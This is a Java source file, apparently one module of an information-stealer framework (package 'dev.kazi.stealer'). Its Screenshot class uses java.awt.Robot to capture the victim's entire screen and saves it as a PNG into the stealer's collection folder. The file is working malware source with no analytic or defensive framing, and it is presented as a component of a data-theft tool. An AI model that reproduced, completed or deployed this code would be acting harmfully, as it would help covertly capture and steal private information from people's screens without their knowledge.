package dev.kazi.stealer.node.nodes.impl;

import java.awt.image.BufferedImage;
import java.awt.AWTException;
import java.io.IOException;
import javax.imageio.ImageIO;
import java.io.File;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.Robot;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Screenshot extends Node {

    public Screenshot() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        Robot robot = null;
        try {
            robot = new Robot();
            final Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            final BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            if (this.getFolder().exists()) {
                ImageIO.write(screenFullImage, "png", new File(this.getFolder() + "\\Screenshot.png"));
            }
        }
        catch (final IOException | AWTException iOException) {
            throw new RuntimeException(iOException);
        }
    }
}
